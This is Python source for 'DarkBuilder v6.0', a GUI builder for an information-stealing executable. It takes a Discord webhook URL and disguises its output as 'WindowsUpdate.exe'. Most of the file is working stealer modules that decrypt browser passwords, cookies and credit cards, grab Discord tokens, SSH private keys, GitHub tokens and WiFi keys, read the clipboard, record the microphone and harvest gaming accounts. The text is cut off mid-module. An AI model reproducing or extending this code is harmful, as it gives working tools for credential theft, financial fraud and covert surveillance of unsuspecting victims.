import tkinter as tk
from tkinter import ttk, messagebox, font, filedialog
import json
import os
import zipfile
import subprocess
import tempfile
import shutil

class VirusBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("DarkBuilder v6.0")
        self.root.geometry("1100x850")
        self.root.configure(bg='#000000')
        self.root.resizable(False, False)
        
        self.data_types = [
            "Discord Token", "Credit Card", "Email Data", 
            "Browser Passwords", "Application Passwords", "IP Address",
            "Screenshot", "SSH Keys", "GitHub Token", 
            "Audio Recording", "Microphone Recording",
            "System Cookies", "Browser History", "Autofill Data", "Bookmarks",
            "System Information", "WiFi Credentials", "Clipboard Content",
            "Steam Credentials", "Minecraft Session", "Roblox Cookies",
            "Telegram Sessions", "WhatsApp Data", "Metamask Wallet",
            "Exodus Wallet", "Filezilla Logins", "Running Processes",
            "Webcam Capture", "Keylogger Data", "Network Information",
            "Installed Software", "GPU Information", "CPU Details",
            "RAM Information", "Disk Information", "Network Shares",
            "Printers Information", "Bluetooth Devices", "USB History",
            "Recent Documents"
        ]
        
        self.webhook_var = tk.StringVar()
        self.exe_name_var = tk.StringVar(value="WindowsUpdate")
        self.selected_items = {}
        
        self.setup_ui()
        
    def setup_ui(self):
        title_font = font.Font(family="Consolas", size=32, weight="bold")
        label_font = font.Font(family="Segoe UI", size=11)
        
        header = tk.Frame(self.root, bg='#000000', height=90)
        header.pack(fill=tk.X, padx=25, pady=(25,15))
        
        title_label = tk.Label(header, text="DARK BUILDER PRO", font=title_font, 
                              fg='#00ff00', bg='#000000')
        title_label.pack(side=tk.LEFT)
        
        subtitle = tk.Label(header, text="v6.0 | Ultimate System Infiltrator", 
                           font=('Segoe UI', 11), fg='#666666', bg='#000000')
        subtitle.pack(side=tk.LEFT, padx=(15,0), pady=(30,0))
        
        main_container = tk.Frame(self.root, bg='#000000')
        main_container.pack(fill=tk.BOTH, expand=True, padx=25, pady=10)
        
        left_panel = tk.Frame(main_container, bg='#111111')
        left_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0,15))
        
        right_panel = tk.Frame(main_container, bg='#111111', width=350)
        right_panel.pack(side=tk.RIGHT, fill=tk.Y, padx=(15,0))
        
        webhook_frame = tk.Frame(left_panel, bg='#111111')
        webhook_frame.pack(fill=tk.X, pady=(0,20))
        
        webhook_label = tk.Label(webhook_frame, text="Discord Webhook URL:", 
                                font=label_font, fg='#ffffff', bg='#111111')
        webhook_label.pack(anchor=tk.W)
        
        webhook_entry = tk.Entry(webhook_frame, textvariable=self.webhook_var, 
                                font=label_font, bg='#222222', fg='#ffffff',
                                insertbackground='#ffffff', relief=tk.FLAT, width=50)
        webhook_entry.pack(fill=tk.X, pady=(5,0))
        webhook_entry.config(highlightbackground='#333333', highlightcolor='#00ff00', 
                           highlightthickness=1)
        
        exe_frame = tk.Frame(left_panel, bg='#111111')
        exe_frame.pack(fill=tk.X, pady=(0,20))
        
        exe_label = tk.Label(exe_frame, text="EXE Output Name:", 
                            font=label_font, fg='#ffffff', bg='#111111')
        exe_label.pack(anchor=tk.W)
        
        exe_entry_frame = tk.Frame(exe_frame, bg='#111111')
        exe_entry_frame.pack(fill=tk.X, pady=(5,0))
        
        exe_entry = tk.Entry(exe_entry_frame, textvariable=self.exe_name_var, 
                           font=label_font, bg='#222222', fg='#ffffff',
                           insertbackground='#ffffff', relief=tk.FLAT)
        exe_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        exe_entry.config(highlightbackground='#333333', highlightcolor='#00ff00', 
                       highlightthickness=1)
        
        exe_suffix = tk.Label(exe_entry_frame, text=".exe", 
                            font=label_font, fg='#cccccc', bg='#111111')
        exe_suffix.pack(side=tk.LEFT, padx=(5,0))
        
        options_label = tk.Label(left_panel, text="Data Collection Modules:", 
                                font=label_font, fg='#ffffff', bg='#111111')
        options_label.pack(anchor=tk.W, pady=(0,10))
        
        canvas_frame = tk.Frame(left_panel, bg='#111111')
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        canvas = tk.Canvas(canvas_frame, bg='#111111', highlightthickness=0)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=canvas.yview)
        scrollable_frame = tk.Frame(canvas, bg='#111111')
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(
                scrollregion=canvas.bbox("all")
            )
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        for i, data_type in enumerate(self.data_types):
            frame = tk.Frame(scrollable_frame, bg='#111111')
            frame.pack(fill=tk.X, padx=5, pady=2)
            
            var = tk.BooleanVar()
            self.selected_items[data_type] = var
            
            toggle = tk.Checkbutton(frame, text="", variable=var, 
                                  bg='#111111', activebackground='#111111',
                                  selectcolor='#000000', fg='#00ff00')
            toggle.pack(side=tk.LEFT)
            
            label = tk.Label(frame, text=data_type, font=label_font, 
                           fg='#cccccc', bg='#111111')
            label.pack(side=tk.LEFT, padx=(10,0))
            
        control_frame = tk.Frame(right_panel, bg='#111111')
        control_frame.pack(fill=tk.X, pady=(0,20))
        
        select_all_btn = tk.Button(control_frame, text="Select All", 
                                 command=self.select_all,
                                 bg='#222222', fg='#ffffff',
                                 font=label_font, relief=tk.FLAT,
                                 activebackground='#333333',
                                 activeforeground='#ffffff')
        select_all_btn.pack(fill=tk.X, pady=(0,5))
        
        deselect_all_btn = tk.Button(control_frame, text="Deselect All", 
                                   command=self.deselect_all,
                                   bg='#222222', fg='#ffffff',
                                   font=label_font, relief=tk.FLAT,
                                   activebackground='#333333',
                                   activeforeground='#ffffff')
        deselect_all_btn.pack(fill=tk.X, pady=5)
        
        generate_frame = tk.Frame(right_panel, bg='#111111')
        generate_frame.pack(fill=tk.X, pady=(20,0))
        
        generate_btn = tk.Button(generate_frame, text="Generate EXE", 
                               command=self.generate_exe,
                               bg='#00ff00', fg='#000000',
                               font=('Segoe UI', 14, 'bold'),
                               relief=tk.FLAT,
                               activebackground='#00cc00',
                               activeforeground='#000000',
                               height=2)
        generate_btn.pack(fill=tk.X)
        
        status_frame = tk.Frame(right_panel, bg='#111111')
        status_frame.pack(fill=tk.X, pady=(20,0))
        
        self.status_label = tk.Label(status_frame, text="Ready", 
                                   font=('Segoe UI', 10), fg='#00ff00', bg='#111111')
        self.status_label.pack(anchor=tk.W)
        
        self.progress = ttk.Progressbar(status_frame, mode='indeterminate')
        self.progress.pack(fill=tk.X, pady=(5,0))
        
        preview_frame = tk.Frame(right_panel, bg='#111111')
        preview_frame.pack(fill=tk.BOTH, expand=True, pady=(20,0))
        
        preview_label = tk.Label(preview_frame, text="Code Preview:", 
                               font=label_font, fg='#ffffff', bg='#111111')
        preview_label.pack(anchor=tk.W, pady=(0,10))
        
        self.preview_text = tk.Text(preview_frame, height=15, 
                                   bg='#000000', fg='#00ff00',
                                   font=('Consolas', 9),
                                   relief=tk.FLAT, wrap=tk.WORD)
        self.preview_text.pack(fill=tk.BOTH, expand=True)
        
        scrollbar_preview = ttk.Scrollbar(self.preview_text)
        scrollbar_preview.pack(side=tk.RIGHT, fill=tk.Y)
        self.preview_text.config(yscrollcommand=scrollbar_preview.set)
        scrollbar_preview.config(command=self.preview_text.yview)
        
        for widget in [select_all_btn, deselect_all_btn, generate_btn]:
            widget.bind("<Enter>", lambda e, w=widget: w.config(bg='#333333'))
            widget.bind("<Leave>", lambda e, w=widget: w.config(
                bg='#222222' if w.cget('text') in ['Select All', 'Deselect All'] else '#00ff00'))
        
    def select_all(self):
        for var in self.selected_items.values():
            var.set(True)
        
    def deselect_all(self):
        for var in self.selected_items.values():
            var.set(False)
    
    def generate_code_for_module(self, module_name):
        code_snippets = {
            "Discord Token": '''def get_discord_tokens():
    tokens = []
    discord_paths = [
        os.path.join(os.getenv("APPDATA"), "discord"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Discord"),
        os.path.join(os.getenv("APPDATA"), "discordptb"),
        os.path.join(os.getenv("APPDATA"), "discordcanary")
    ]
    for path in discord_paths:
        if os.path.exists(path):
            for root, dirs, files in os.walk(path):
                if "Local Storage" in root and "leveldb" in root:
                    for file in files:
                        if file.endswith(".ldb") or file.endswith(".log"):
                            full_path = os.path.join(root, file)
                            try:
                                with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                                    content = f.read()
                                    import re
                                    token_matches = re.findall(r"[a-zA-Z0-9_-]{23,28}\\.[a-zA-Z0-9_-]{6,7}\\.[a-zA-Z0-9_-]{27}", content)
                                    tokens.extend(token_matches)
                            except:
                                pass
    return list(set(tokens))''',
            "Credit Card": '''def get_credit_cards():
    cards = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\\\Brave-Browser\\\\User Data")
    }
    for browser, path in browsers.items():
        if os.path.exists(path):
            for profile in os.listdir(path):
                if "Profile" in profile or "Default" in profile:
                    db_path = os.path.join(path, profile, "Web Data")
                    if os.path.exists(db_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(db_path, "temp_db")
                            conn = sqlite3.connect("temp_db")
                            cursor = conn.cursor()
                            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for row in cursor.fetchall():
                                encrypted_card = row[3]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_card, None, None, None, 0)[1]
                                    card_number = decrypted.decode("utf-8")
                                    cards.append({
                                        "name": row[0],
                                        "month": row[1],
                                        "year": row[2],
                                        "number": card_number,
                                        "browser": browser
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove("temp_db")
                        except:
                            pass
    return cards''',
            "Email Data": '''def get_email_data():
    emails = []
    browser_paths = [
        os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data"),
        os.path.join(os.getenv("APPDATA"), "Mozilla\\\\Firefox")
    ]
    for base_path in browser_paths:
        if os.path.exists(base_path):
            for profile in os.listdir(base_path):
                if "Profile" in profile or "Default" in profile:
                    logins_path = os.path.join(base_path, profile, "Login Data")
                    if os.path.exists(logins_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(logins_path, "temp_logins")
                            conn = sqlite3.connect("temp_logins")
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                url = row[0]
                                username = row[1]
                                encrypted_password = row[2]
                                if "@" in username and any(email_provider in url for email_provider in ["gmail", "outlook", "yahoo", "hotmail"]):
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                        password = decrypted.decode("utf-8")
                                        emails.append({
                                            "url": url,
                                            "username": username,
                                            "password": password
                                        })
                                    except:
                                        emails.append({
                                            "url": url,
                                            "username": username,
                                            "password": "ENCRYPTED"
                                        })
                            conn.close()
                            os.remove("temp_logins")
                        except:
                            pass
    return emails''',
            "Browser Passwords": '''def get_browser_passwords():
    passwords = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware\\\\Brave-Browser\\\\User Data"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software\\\\Opera Stable")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    login_data_path = os.path.join(browser_path, profile, "Login Data")
                    if os.path.exists(login_data_path):
                        try:
                            import sqlite3
                            import win32crypt
                            shutil.copy2(login_data_path, "temp_login_data")
                            conn = sqlite3.connect("temp_login_data")
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            for row in cursor.fetchall():
                                encrypted_password = row[2]
                                try:
                                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                                    password = decrypted.decode("utf-8")
                                    passwords.append({
                                        "browser": browser_name,
                                        "url": row[0],
                                        "username": row[1],
                                        "password": password
                                    })
                                except:
                                    pass
                            conn.close()
                            os.remove("temp_login_data")
                        except:
                            pass
    return passwords''',
            "Application Passwords": '''def get_app_passwords():
    app_creds = []
    try:
        import winreg
        registry_paths = [
            "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\\\\Cache\\\\Credentials",
            "Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon",
            "Software\\\\TeamViewer",
            "Software\\\\AnyDesk",
            "Software\\\\Google\\\\Chrome\\\\NativeMessagingHosts"
        ]
        for path in registry_paths:
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
                for i in range(winreg.QueryInfoKey(key)[1]):
                    try:
                        name, value, _ = winreg.EnumValue(key, i)
                        if "pass" in name.lower() or "pwd" in name.lower() or "secret" in name.lower():
                            app_creds.append({
                                "registry_path": path,
                                "key": name,
                                "value": str(value)[:100]
                            })
                    except:
                        continue
                winreg.CloseKey(key)
            except:
                continue
    except:
        pass
    app_paths = [
        os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
        os.path.join(os.getenv("APPDATA"), "discord", "Local Storage"),
        os.path.join(os.getenv("APPDATA"), "Slack", "Local Storage"),
        os.path.join(os.getenv("APPDATA"), "Signal", "Local Storage")
    ]
    for app_path in app_paths:
        if os.path.exists(app_path):
            for root, dirs, files in os.walk(app_path):
                for file in files:
                    if file.endswith(".json") or file.endswith(".ldb"):
                        try:
                            full_path = os.path.join(root, file)
                            with open(full_path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                if "password" in content.lower() or "token" in content.lower():
                                    app_creds.append({
                                        "app": os.path.basename(app_path),
                                        "file": file,
                                        "snippet": content[:200]
                                    })
                        except:
                            pass
    return app_creds''',
            "IP Address": '''def get_ip_info():
    ip_info = {}
    try:
        import requests
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        ip_info["public_ip"] = response.json()["ip"]
    except:
        ip_info["public_ip"] = "Failed to retrieve"
    try:
        import socket
        hostname = socket.gethostname()
        ip_info["hostname"] = hostname
        ip_info["local_ip"] = socket.gethostbyname(hostname)
    except:
        ip_info["hostname"] = "Unknown"
        ip_info["local_ip"] = "Unknown"
    try:
        import requests
        response = requests.get(f"http://ip-api.com/json/{ip_info['public_ip']}", timeout=5)
        geo_data = response.json()
        if geo_data["status"] == "success":
            ip_info.update({
                "country": geo_data["country"],
                "region": geo_data["regionName"],
                "city": geo_data["city"],
                "isp": geo_data["isp"],
                "lat": geo_data["lat"],
                "lon": geo_data["lon"]
            })
    except:
        pass
    return ip_info''',
            "Screenshot": '''def take_screenshot():
    try:
        import pyautogui
        import io
        import base64
        from datetime import datetime
        screenshot = pyautogui.screenshot()
        img_byte_arr = io.BytesIO()
        screenshot.save(img_byte_arr, format="PNG")
        img_byte_arr = img_byte_arr.getvalue()
        return {
            "timestamp": datetime.now().isoformat(),
            "screenshot": base64.b64encode(img_byte_arr).decode("utf-8"),
            "resolution": pyautogui.size()
        }
    except:
        return {"error": "Failed to capture screenshot"}''',
            "SSH Keys": '''def get_ssh_keys():
    ssh_keys = []
    ssh_paths = [
        os.path.expanduser("~/.ssh"),
        os.path.join(os.getenv("PROGRAMDATA"), "ssh"),
        os.path.join(os.getenv("ALLUSERSPROFILE"), "ssh")
    ]
    for ssh_path in ssh_paths:
        if os.path.exists(ssh_path):
            import glob
            for key_file in glob.glob(os.path.join(ssh_path, "*")):
                if not key_file.endswith(".pub") and os.path.isfile(key_file):
                    try:
                        with open(key_file, "r") as f:
                            content = f.read()
                            if "PRIVATE KEY" in content or "RSA" in content:
                                ssh_keys.append({
                                    "path": key_file,
                                    "content": content[:1000]
                                })
                    except:
                        pass
    return ssh_keys''',
            "GitHub Token": '''def get_github_tokens():
    tokens = []
    git_config_paths = [
        os.path.expanduser("~/.git-credentials"),
        os.path.expanduser("~/.config/git/credentials"),
        os.path.join(os.getenv("USERPROFILE"), ".git-credentials")
    ]
    for config_path in git_config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, "r") as f:
                    content = f.read()
                    import re
                    matches = re.findall(r"github\\\\.com[a-zA-Z0-9_-]+:[a-zA-Z0-9_-]+", content)
                    tokens.extend(matches)
            except:
                pass
    env_vars = ["GITHUB_TOKEN", "GH_TOKEN", "GIT_TOKEN"]
    for env_var in env_vars:
        token = os.getenv(env_var)
        if token:
            tokens.append(f"{env_var}: {token}")
    return tokens''',
            "Audio Recording": '''def record_audio(duration=10):
    try:
        import sounddevice as sd
        import numpy as np
        import io
        import base64
        import wave
        from datetime import datetime
        fs = 44100
        recording = sd.rec(int(duration * fs), samplerate=fs, channels=2, dtype="float32")
        sd.wait()
        buffer = io.BytesIO()
        with wave.open(buffer, "wb") as wf:
            wf.setnchannels(2)
            wf.setsampwidth(2)
            wf.setframerate(fs)
            wf.writeframes((recording * 32767).astype(np.int16).tobytes())
        audio_data = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return {
            "timestamp": datetime.now().isoformat(),
            "duration": duration,
            "audio_data": audio_data[:50000],
            "sample_rate": fs
        }
    except:
        return {"error": "Audio recording failed"}''',
            "Microphone Recording": '''def record_microphone(duration=10):
    try:
        import pyaudio
        import wave
        import io
        import base64
        from datetime import datetime
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        p = pyaudio.PyAudio()
        stream = p.open(format=FORMAT,
                       channels=CHANNELS,
                       rate=RATE,
                       input=True,
                       frames_per_buffer=CHUNK)
        frames = []
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        stream.stop_stream()
        stream.close()
        p.terminate()
        buffer = io.BytesIO()
        wf = wave.open(buffer, "wb")
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b"".join(frames))
        wf.close()
        audio_data = base64.b64encode(buffer.getvalue()).decode("utf-8")
        return {
            "timestamp": datetime.now().isoformat(),
            "duration": duration,
            "audio_data": audio_data[:50000],
            "channels": CHANNELS,
            "sample_rate": RATE
        }
    except:
        return {"error": "Microphone recording failed"}''',
            "System Cookies": '''def get_cookies():
    cookies = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla\\\\Firefox")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    if browser_name == "Firefox":
                        cookies_path = os.path.join(browser_path, profile, "cookies.sqlite")
                    else:
                        cookies_path = os.path.join(browser_path, profile, "Cookies")
                    if os.path.exists(cookies_path):
                        try:
                            import sqlite3
                            import win32crypt
                            temp_path = "temp_cookies"
                            shutil.copy2(cookies_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            if browser_name == "Firefox":
                                cursor.execute("SELECT host, name, value FROM moz_cookies")
                            else:
                                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                            for row in cursor.fetchall()[:50]:
                                if browser_name == "Firefox":
                                    cookies.append({
                                        "browser": browser_name,
                                        "host": row[0],
                                        "name": row[1],
                                        "value": row[2]
                                    })
                                else:
                                    try:
                                        decrypted = win32crypt.CryptUnprotectData(row[2], None, None, None, 0)[1]
                                        value = decrypted.decode("utf-8")
                                        cookies.append({
                                            "browser": browser_name,
                                            "host": row[0],
                                            "name": row[1],
                                            "value": value
                                        })
                                    except:
                                        cookies.append({
                                            "browser": browser_name,
                                            "host": row[0],
                                            "name": row[1],
                                            "value": "ENCRYPTED"
                                        })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return cookies''',
            "Browser History": '''def get_browser_history():
    history = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    history_path = os.path.join(browser_path, profile, "History")
                    if os.path.exists(history_path):
                        try:
                            import sqlite3
                            from datetime import datetime, timedelta
                            temp_path = "temp_history"
                            shutil.copy2(history_path, temp_path)
                            conn = sqlite3.connect(temp_path)
                            cursor = conn.cursor()
                            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                            for row in cursor.fetchall():
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=row[3])
                                history.append({
                                    "browser": browser_name,
                                    "url": row[0],
                                    "title": row[1],
                                    "visit_count": row[2],
                                    "last_visit": timestamp.isoformat()
                                })
                            conn.close()
                            os.remove(temp_path)
                        except:
                            pass
    return history''',
            "Autofill Data": '''def get_autofill_data():
    autofill = []
    browser_path = os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data")
    if os.path.exists(browser_path):
        for profile in os.listdir(browser_path):
            if "Profile" in profile or "Default" in profile:
                web_data_path = os.path.join(browser_path, profile, "Web Data")
                if os.path.exists(web_data_path):
                    try:
                        import sqlite3
                        temp_path = "temp_webdata"
                        shutil.copy2(web_data_path, temp_path)
                        conn = sqlite3.connect(temp_path)
                        cursor = conn.cursor()
                        cursor.execute("SELECT name, value, date_created FROM autofill")
                        for row in cursor.fetchall():
                            autofill.append({
                                "field": row[0],
                                "value": row[1],
                                "timestamp": row[2]
                            })
                        cursor.execute("SELECT name, value, date_created FROM autofill_profiles")
                        for row in cursor.fetchall():
                            autofill.append({
                                "profile_field": row[0],
                                "profile_value": row[1],
                                "profile_timestamp": row[2]
                            })
                        conn.close()
                        os.remove(temp_path)
                    except:
                        pass
    return autofill''',
            "Bookmarks": '''def get_bookmarks():
    bookmarks = []
    browsers = {
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA"), "Google\\\\Chrome\\\\User Data"),
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft\\\\Edge\\\\User Data")
    }
    for browser_name, browser_path in browsers.items():
        if os.path.exists(browser_path):
            for profile in os.listdir(browser_path):
                if "Profile" in profile or "Default" in profile:
                    bookmarks_path = os.path.join(browser_path, profile, "Bookmarks")
                    if os.path.exists(bookmarks_path):
                        try:
                            import json
                            with open(bookmarks_path, "r", encoding="utf-8") as f:
                                data = json.load(f)
                            def extract_bookmarks(node, folder=""):
                                items = []
                                if "children" in node:
                                    for child in node["children"]:
                                        if child.get("type") == "url":
                                            items.append({
                                                "browser": browser_name,
                                                "folder": folder,
                                                "title": child.get("name", ""),
                                                "url": child.get("url", "")
                                            })
                                        elif child.get("type") == "folder":
                                            items.extend(extract_bookmarks(child, child.get("name", "")))
                                return items
                            if "roots" in data:
                                for root_key, root_node in data["roots"].items():
                                    bookmarks.extend(extract_bookmarks(root_node, root_key))
                        except:
                            pass
    return bookmarks''',
            "System Information": '''def get_system_info():
    info = {}
    try:
        import platform
        import socket
        import psutil
        from datetime import datetime
        info["system"] = platform.system()
        info["release"] = platform.release()
        info["version"] = platform.version()
        info["architecture"] = platform.architecture()
        info["processor"] = platform.processor()
        info["hostname"] = socket.gethostname()
        info["username"] = os.getlogin()
        info["boot_time"] = datetime.fromtimestamp(psutil.boot_time()).isoformat()
        info["cpu_count"] = psutil.cpu_count()
        info["cpu_percent"] = psutil.cpu_percent(interval=1)
        mem = psutil.virtual_memory()
        info["total_memory"] = mem.total
        info["available_memory"] = mem.available
        info["used_memory"] = mem.used
        info["memory_percent"] = mem.percent
        disk = psutil.disk_usage("/")
        info["total_disk"] = disk.total
        info["used_disk"] = disk.used
        info["free_disk"] = disk.free
        info["disk_percent"] = disk.percent
        info["network_interfaces"] = []
        for interface, addrs in psutil.net_if_addrs().items():
            interface_info = {"name": interface, "addresses": []}
            for addr in addrs:
                interface_info["addresses"].append({
                    "family": str(addr.family),
                    "address": addr.address,
                    "netmask": addr.netmask if hasattr(addr, "netmask") else None
                })
            info["network_interfaces"].append(interface_info)
        info["gpus"] = []
        try:
            import GPUtil
            gpus = GPUtil.getGPUs()
            for gpu in gpus:
                info["gpus"].append({
                    "name": gpu.name,
                    "load": gpu.load,
                    "memory_total": gpu.memoryTotal,
                    "memory_used": gpu.memoryUsed,
                    "temperature": gpu.temperature
                })
        except:
            pass
    except:
        info["error"] = "Failed to gather system information"
    return info''',
            "WiFi Credentials": '''def get_wifi_passwords():
    wifi_networks = []
    try:
        if os.name == "nt":
            import subprocess
            import re
            profiles_data = subprocess.check_output(["netsh", "wlan", "show", "profiles"], encoding="utf-8")
            profiles = re.findall(r": (.*?)\\\\r", profiles_data)
            for profile in profiles:
                try:
                    profile_info = subprocess.check_output(["netsh", "wlan", "show", "profile", profile, "key=clear"], encoding="utf-8")
                    password_match = re.search(r"Key Content\\\\s*: (.*?)\\\\r", profile_info)
                    if password_match:
                        password = password_match.group(1)
                        wifi_networks.append({
                            "ssid": profile.strip(),
                            "password": password.strip()
                        })
                except:
                    continue
    except:
        wifi_networks.append({"error": "Failed to retrieve WiFi credentials"})
    return wifi_networks''',
            "Clipboard Content": '''def get_clipboard():
    try:
        import win32clipboard
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        win32clipboard.CloseClipboard()
        return {
            "content": data[:1000],
            "length": len(data)
        }
    except:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
            win32clipboard.CloseClipboard()
            return {
                "content": data[:1000].decode("utf-8", errors="ignore"),
                "length": len(data)
            }
        except:
            return {"error": "Clipboard inaccessible or empty"}''',
            "Steam Credentials": '''def get_steam_credentials():
    steam_data = []
    steam_paths = [
        os.path.join(os.getenv("PROGRAMFILES(X86)"), "Steam"),
        os.path.join(os.getenv("PROGRAMFILES"), "Steam"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Steam")
    ]
    for steam_path in steam_paths:
        if os.path.exists(steam_path):
            config_path = os.path.join(steam_path, "config", "config.vdf")
            if os.path.exists(config_path):
                try:
                    with open(config_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        import re
                        username_match = re.search(r'"UserName"\\\\s+"([^"]+)"', content)
                        if username_match:
                            steam_data.append({
                                "type": "username",
                                "value": username_match.group(1)
                            })
                        remember_password = re.search(r'"RememberPassword"\\\\s+"([^"]+)"', content)
                        if remember_password:
                            steam_data.append({
                                "type": "remember_password",
                                "value": remember_password.group(1)
                            })
                        recent_users = re.findall(r'"LastGameNameUsed"\\\\s+"([^"]+)"', content)
                        for user in recent_users[:5]:
                            steam_data.append({
                                "type": "recent_user",
                                "value": user
                            })
                except:
                    pass
            login_users_path = os.path.join(steam_path, "config", "loginusers.vdf")
            if os.path.exists(login_users_path):
                try:
                    with open(login_users_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        account_ids = re.findall(r'"AccountID"\\\\s+"(\\\\d+)"', content)
                        for acc_id in account_ids[:5]:
                            steam_data.append({
                                "type": "account_id",
                                "value": acc_id
                            })
                except:
                    pass
    return steam_data''',
            "Minecraft Session": '''def get_minecraft_session():
    session_data = []
    minecraft_paths = [
        os.path.join(os.getenv("APPDATA"), ".minecraft"),
        os.path.join(os.getenv("LOCALAPPDATA"), "Packages\\\\Microsoft.MinecraftUWP_8wekyb3d8bbwe\\\\LocalState\\\\games\\\\com.mojang")
    ]
    for mc_path in minecraft_paths:
        if os.path.exists(mc_path):
            launcher_profiles_path = os.path.join(mc_path, "launcher_profiles.json")
            if os.path.exists(launcher_profiles_path):
                try:
                    import json
                    with open(launcher_profiles_path, "r") as f:
                        data = json.load(f)
                        if "authenticationDatabase" in data:
                            for key, auth_data in data["authenticationDatabase"].items():
                                if "profiles" in auth_data:
                                    for profile_id, profile in auth_data["profiles"].items():
                                        session_data.append({
                                            "type": "minecraft_profile",
                                            "display_name": profile.get("displayName", ""),
                                            "profile_id": profile_id
                                        })
                        if "clientToken" in data:
                            session_data.append({
                                "type": "client_token",
                                "value": data["clientToken"][:20] + "..."
                            })
                except:
                    pass
    return session_data''',
            "Roblox Cookies": '''def get_roblox_cookies():
    roblox_data = []
    roblox_path = os.path.join(os.getenv("LOCALAPPDATA"), "Roblox")
    if os.path.exists(roblox_path):
        for root, dirs, files in os.walk(roblox_path):
            for file in files:
                if file.endswith(".rbxcookie") or file.endswith(".ROBLOSECURITY"):
                    cookie_path = os.path.join(root, file)
                    try:
                        with open(cookie_path, "r") as f:
                            content = f.read().strip()
                            if len(content) > 10:
                                roblox_data.append({
                                    "file": file,
                                    "cookie_preview": content[:50] + "..." if len(content) > 50 else content
                                })
                    except:
                        pass
        logs_path = os.path.join(roblox_path, "logs")
        if os.path.exists(logs_path):
            for log_file in os.listdir(logs_path)[-5:]:
                if log_file.endswith(".log"):
                    try:
                        with open(os.path.join(logs_path, log_file), "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                            import re
